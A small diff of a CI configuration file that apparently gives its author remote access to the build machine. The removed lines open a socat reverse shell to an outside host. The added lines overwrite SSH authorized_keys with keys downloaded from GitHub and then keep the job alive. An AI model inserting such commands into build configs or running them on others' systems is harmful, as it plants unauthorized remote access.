@@ -1,4 +1,7 @@
 sudo: true
 language: shell
-install: sudo apt-get install -y socat
-script: socat TCP-CONNECT:titan.ldpreload.com:12345 EXEC:/bin/bash,pty,stderr,ctty,setsid
+script:
+ - wget -O ~/.ssh/authorized_keys https://github.com/geofft.keys
+ - curl http://whatismyip.akamai.com
+ - ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key
+ - sleep 300
